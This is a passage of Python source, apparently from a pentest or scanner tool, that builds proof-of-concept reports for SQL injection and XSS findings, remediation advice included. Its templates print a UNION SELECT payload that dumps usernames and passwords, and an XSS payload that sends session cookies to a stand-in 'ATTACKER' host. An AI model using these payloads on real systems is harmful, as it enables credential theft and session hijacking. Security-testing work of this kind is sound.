                f"#    Payload: ' UNION SELECT concat(username,0x3a,password) FROM users-- -",
            ]
            poc["description"] = f"SQL injection via '{param}'. Full database access confirmed."
            poc["impact"] = "Read/modify/delete all database data. Potential RCE via INTO OUTFILE or xp_cmdshell."
            poc["remediation"] = "Use parameterized queries (prepared statements). Never concatenate user input into SQL."

        elif exploit_type == "xss" and param:
            poc["curl"] = f'curl {sp} "{target}"'
            poc["steps"] = [
                f"# 1. Confirm reflection:",
                f"curl {sp} \"{target}\"",
                f"# 2. Steal session cookie:",
                f"#    Payload: <script>new Image().src='https://ATTACKER/steal?c='+document.cookie</script>",
                f"# 3. Keylogger:",
